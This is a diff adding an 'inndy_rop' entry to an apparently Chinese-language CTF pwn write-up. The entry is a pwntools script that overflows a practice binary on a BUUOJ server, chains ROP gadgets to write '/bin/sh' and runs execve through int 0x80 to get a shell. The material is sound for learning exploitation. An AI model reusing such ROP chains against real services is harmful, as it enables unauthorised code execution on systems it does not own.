@@ -814,3 +814,36 @@ log.success(f'read={hex(leaked_func)}; base={hex(libc_base)}; gadget={hex(gadget
 p.send(p64(gadget))
 p.interactive()
 ```
+
+### inndy_rop
+
+跟[cmcc_simplerop](#cmcc_simplerop) 一样是静态链接的程序，剥掉了system以及/bin/sh，需要自己调用read把/bin/sh写入内存。
+
+```python
+#!/usr/bin/python3.6
+from pwn import *
+
+filename = './rop'
+# p = process(filename)
+p = remote('node3.buuoj.cn', 26957)
+e = ELF(filename)
+
+write_addr = 0x80e9000+0x10a0
+pop_eax_ret = 0x080b8016
+pop_ebx_ret = 0x080481c9
+pop_ecx_ret = 0x080de769
+pop_edx_ret = 0x0806ecda
+# pop esi ; pop ebx ; pop edx ; ret
+pop_esi_ebx_edx_ret = 0x0806ecd8
+int_0x80 = 0x0806c943
+
+offset = 0xc + 4
+
+payload = b'b' * offset + p32(e.sym["read"]) + p32(pop_esi_ebx_edx_ret) + p32(0) + p32(write_addr) + p32(0xc) + p32(pop_ecx_ret) + p32(write_addr+0x8) + p32(pop_edx_ret) + p32(write_addr+0xc) + p32(pop_eax_ret) + p32(11) + p32(int_0x80)
+p.sendline(payload)
+
+payload = b'/bin/sh\x00' + p32(write_addr) + p32(0)
+p.sendline(payload)
+
+p.interactive()
+```
